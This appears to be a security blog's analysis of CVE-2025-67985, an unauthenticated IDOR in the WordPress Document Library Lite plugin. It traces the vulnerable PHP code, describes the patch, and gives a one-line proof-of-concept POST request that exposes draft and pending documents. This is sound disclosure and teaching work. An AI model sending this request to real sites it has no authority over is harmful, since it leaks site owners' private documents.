# CVE-2025-67985 Analysis & POC


<!--more-->

## CVE & Basic Info

A vulnerability involving **authorization bypass via user-controlled keys** in the **Document Library Lite** plugin by **Barn2 Plugins** allows exploitation of **misconfigured access control security levels**.
This vulnerability affects **Document Library Lite** from **unknown versions** up to **version 1.1.7 and below**.

* **CVE ID**: [CVE-2025-67985](https://www.cve.org/CVERecord?id=CVE-2025-67985)
* **Vulnerability Type**: Insecure direct object references (IDOR)
* **Affected Versions**: <= 1.1.7
* **Patched Versions**: 1.2.0
* **CVSS severity**: Low (5.3)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress Document Library Lite Plugin](https://wordpress.org/plugins/document-library-lite/)

## Requirements

* **Local WordPress & Debugging**

  * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
  * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** – **Document Library Lite**:

  * `1.1.6` – **vulnerable**
  * `1.2.0` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) or any diff tool.

> [!NOTE]
> The vulnerability is officially disclosed as affecting versions up to 1.1.7, but in reality it was already patched in version 1.1.7. We download version 1.1.6 for analysis.

## Analysis

The plugin registers the following action hook:

```php {title="Ajax_Handler.php v1.1.6" data-open=true hl_lines=[]}
add_action( 'wp_ajax_nopriv_dll_load_posts', [ $this, 'load_posts' ] );
```

`wp_ajax_nopriv_` is a hook available to all users (including unauthenticated users). Anyone can call the AJAX action:

```php
/wp-admin/admin-ajax.php?action=dll_load_posts
```

And execute the `load_posts()` function:

```php {title="Ajax_Handler.php v1.1.6" data-open=true hl_lines=[6]}
const SHORTCODE = 'doc_library';
public function load_posts() {
    $args = Options::handle_shortcode_attribute_aliases( $_POST[ 'args' ] );
    $args = shortcode_atts( Options::get_defaults(), $args, self::SHORTCODE );

    $table = new simple_Document_Library( $args );
    $response = $table->get_table( 'array' );

    // Return the response as JSON
    wp_send_json($response);   
}
```

The `load_posts()` function calls `handle_shortcode_attribute_aliases` with user input from `$_POST['args']`:

```php {title="Options.php v1.1.6" data-open=true hl_lines=[]}
public static function handle_shortcode_attribute_aliases( $atts ) {
    if ( isset( $atts['content'] ) ) {
        $atts['columns'] = $atts['content'];
        unset( $atts['content'] );
    }

    if ( isset( $atts['docs_per_page'] ) ) {
        $atts['rows_per_page'] = $atts['docs_per_page'];
        unset( $atts['docs_per_page'] );
    }

    return $atts;
}
```

This function only performs parameter mapping (renaming):

* `content` → `columns`
* `docs_per_page` → `rows_per_page`

Then returns the `$atts` array.

Next, `load_posts()` calls:

```php
$args = shortcode_atts( Options::get_defaults(), $args, self::SHORTCODE );
```

to merge default parameters (`Options::get_defaults()`) with user-supplied `$args`:

![Option](option.png "Default shortcode options")

Among them, `status` determines which document statuses are displayed.

Document status can be changed when creating/editing a document:

![Status](status.png "Change status")

`pending` and `draft` are non-public document statuses. Only users with sufficient privileges should be able to view them.

`load_posts()` initializes `simple_Document_Library` with user-controlled `$args`:

```php
$table = new simple_Document_Library( $args );
```

`validate_options()` is called in the constructor of `simple_Document_Library`:

```php
public function __construct( $args ) {
    $this->args = $this->validate_options( $args );
    $this->set_post_args();
}
```

Here, not only the three statuses `publish`, `pending`, and `draft` exist, but also two additional statuses `future` and `any`, as seen in `validate_options()`:

```php {title="Simple_Document_Library.php v1.1.6" data-open=true hl_lines=[10]}
public function validate_options( $args ) {
    // Validate all the boolean options in the database
    $boolean_options = [ 'lazy_load', 'lightbox', 'wrap', 'search_on_click' ];

    foreach( $boolean_options as $option ) {
        $args[ $option ] = is_string( $args[ $option ] ) ? $args[ $option ] === "true" : $args[ $option ];
    }

    // The post status can only have these values
    $valid_post_statuses = [ 'publish', 'pending', 'draft', 'future', 'any' ];
    $args[ 'status' ] = in_array( $args['status'], $valid_post_statuses ) ? $args[ 'status' ] : 'publish';
    
    return $args;
}
```

This function only validates allowed values and does not perform any permission checks.

Because `status` allows `pending`, `draft`, `future`, and `any`, a user can supply these values to view non-public documents → **authorization bypass**.

```php
$response = $table->get_table( 'array' );
```

`get_table()` is then called:

```php {title="Simple_Document_Library.php v1.1.6" data-open=false hl_lines=[]}
public function get_table( $output_type = 'html' ) {
    $columns = $this->get_columns();

    // Parse DataTables parameters from the AJAX request
    $draw   = isset( $_POST['draw'] ) ? intval( $_POST['draw'] ) : 1;
    $this->args['offset']  = isset( $_POST['start'] ) ? intval( $_POST['start'] ) : 0;
    $this->args['rows_per_page'] = isset( $_POST['length'] ) && intval( $_POST['length'] ) !== -1 ? intval( $_POST['length'] ) : $this->args['rows_per_page'];
    $this->args['sort_by'] = isset( $_POST['order'] ) ? $columns[$_POST['order'][0]['column']] : $this->get_orderby();
    $this->args['sort_order'] = isset( $_POST['order'] ) ? $_POST['order'][0]['dir'] : $this->args['sort_order'];
    $this->args['search_value'] = isset( $_POST['search'] ) ? $_POST['search']['value'] : '';
    $this->args['rows_per_page'] = filter_var( $this->args['rows_per_page'], FILTER_VALIDATE_INT );

    if ( $this->args['rows_per_page'] < 1 || ! $this->args['rows_per_page'] ) {
        $this->args['rows_per_page'] = false;
    }
    if( isset( $_POST['category'] ) ) {
        $this->args['doc_category'] = $_POST['category'];
    }

    if ( ! in_array( $this->args['sort_by'], Options::get_allowed_columns(), true ) ) {
        $this->args['sort_by'] = Options::get_default_settings()['sort_by'];
    }

    if ( ! in_array( $this->args['sort_order'], [ 'asc', 'desc' ], true ) ) {
        $this->args['sort_order'] = Options::get_default_settings()['sort_order'];
    }

    // Set default sort direction
    if ( ! $this->args['sort_order'] ) {
        if ( $this->args['sort_by'] === 'date' ) {
            $this->args['sort_order'] = 'desc';
        } else {
            $this->args['sort_order'] = 'asc';
        }
    }

    $this->args['content_length']  = filter_var( $this->args['content_length'], FILTER_VALIDATE_INT );
    $this->args['scroll_offset']   = filter_var( $this->args['scroll_offset'], FILTER_VALIDATE_INT );

    if ( empty( $this->args['date_format'] ) ) {
        $this->args['date_format'] = Options::get_default_settings()['date_format'];
    }

    $output       = '';
    $table_body   = '';
    $body_row_fmt = '';

    // After an AJAX request, the paramaters should be set again
    $this->set_post_args();
    // Get all published posts in the current language
    $all_posts = $this->run_table_query( $this->build_table_query( $this->post_args ) );

    // Bail early if no posts found
    if ( ! $all_posts || ! is_array( $all_posts ) ) {
        return $output;
    }
    
    // Add placeholder to table body format string so that content for this column is included in table output
    $cell_fmt     = '<td>{%s}</td>';
    $array_output = [];
    foreach ( $columns as $column ) {
        $body_row_fmt .= sprintf( $cell_fmt, $column );
    }
    if ( $output_type === 'html' ) {
        // Build table body
        $body_row_fmt = '<tr>' . $body_row_fmt . '</tr>';

        // Loop through posts and add a row for each
        foreach ( (array) $all_posts as $_post ) {
            setup_postdata( $_post );

            $post_data_trans = apply_filters(
                'document_library_table_row_data_format',
                $this->get_row_content( $_post )
            );

            $table_body .= strtr( $body_row_fmt, $post_data_trans );
        } // foreach post

        wp_reset_postdata();
        return $table_body;
    } else {
        // Loop through posts and add a row for each
        foreach ( (array) $all_posts as $_post ) {
            setup_postdata( $_post );
            $array_output[] = $this->get_row_content( $_post );
        }
    }

    // Increment the table count
    ++self::$table_count;
    if ( $output_type === 'html' ) {
        return apply_filters( 'document_library_table_html_output', $output, $this->args );
    } else {
        $total_posts = $this->get_total_posts();

        // Prepare the response
        $response = [
            'draw'            => $draw,
            'recordsTotal'    => $total_posts,
            'recordsFiltered' => $total_posts, // You can filter further if you add search functionality
            'data'            => $array_output,
        ];

        wp_send_json( $response );

        // return "";
    }
}
```

`get_table()` reads multiple parameters directly from `$_POST`, assigns them to `$this->args`, and uses them to build and execute document queries **without checking user permissions**. Since the initial `$args` (including `status`) are client-controlled, users can query and retrieve documents with `pending` or `draft` status. The results are returned directly via JSON, leading to **authorization bypass / IDOR**.

Finally, `wp_send_json($response)` **returns the entire document data to the client**.

```php
wp_send_json($response);   
```

The patch fully mitigates the vulnerability by:

* Forcing unauthenticated users to only view `publish` documents
* Returning an `error` if `status` is not `publish` and the user lacks the `edit_posts` capability

![Patch](patch.png "Patch")

## Flow

{{< mermaid >}}
flowchart TD

A["Unauthenticated user"]
--> B["Send POST request to /wp-admin/admin-ajax.php?action=dll_load_posts with args[status]=pending|draft|future|any"]
B --> C["wp_ajax_nopriv_dll_load_posts hook triggered"]
C --> D["Ajax_Handler::load_posts()"]
D --> E["Read user-controlled $_POST['args']"]
E --> F["Options::handle_shortcode_attribute_aliases()"]
F --> G["Merge with default options via shortcode_atts()"]
G --> H["Initialize simple_Document_Library($args)"]
H --> I["validate_options(): only validate value, no permission check"]
I --> J["status accepted: publish/pending/draft/future/any"]
J --> K["Build query using user-controlled status"]
K --> L["Query documents including non-public ones"]
L --> M["get_table('array')"]
M --> N["wp_send_json(response)"]
N --> O["Non-public documents returned to user"]

{{< /mermaid >}}

## Proof of Concept (PoC)

Send request:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost

action=dll_load_posts&args[status]=any
```

**Result**:

![Result](result.png "Result")

## Conclusion

The vulnerability occurs because a public AJAX endpoint trusts the client-controlled `status` parameter and directly uses it to query documents without performing permission checks. This allows unauthenticated users to access non-public documents, resulting in an authorization bypass / IDOR.

## Key Takeaways

* Validation does not replace authorization
* `wp_ajax_nopriv_*` is a public attack surface
* Query-affecting parameters must be bound to user permissions
* Returning JSON without permission checks can cause data leakage

## References

[IDOR](https://book.hacktricks.wiki/en/pentesting-web/idor.html)

[WordPress Document Library Lite Plugin <= 1.1.7 is vulnerable to Insecure Direct Object References (IDOR)](https://patchstack.com/database/wordpress/plugin/document-library-lite/vulnerability/wordpress-document-library-lite-plugin-1-1-7-insecure-direct-object-references-idor-vulnerability)


---

> Author: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/posts/2025-12-20-cve-2025-67985/  

